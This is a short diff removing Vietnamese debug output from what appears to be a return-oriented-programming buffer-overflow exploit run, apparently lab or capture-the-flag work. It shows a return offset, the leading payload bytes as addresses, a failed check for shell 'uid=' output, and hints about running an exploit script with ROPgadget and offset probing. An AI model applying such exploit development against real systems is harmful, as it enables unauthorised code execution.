@@ -1,8 +1,0 @@
-
---- [Phase4 diag] Không thấy uid= trong output ---
-variant='default'  OFFSET_RET=72  returncode=0  (exit 0)
-PHASE4_DEBUG: 32 byte đầu payload (sau padding): 16104000000000009a114000000000004f207abd317f00001610400000000000
-Độ dài stdout thu được: 0 byte
-stdout rỗng — thường gặp khi SEGV im lặng hoặc thoát rất sớm sau overflow.
-Gợi ý: python3 exploits/exploit_phase4_rop.py sweep | stdin mặc định pipe; PHASE4_USE_PTY=1 nếu cần tty | libc, ROPgadget, OFFSET_RET (GDB/probe).
-
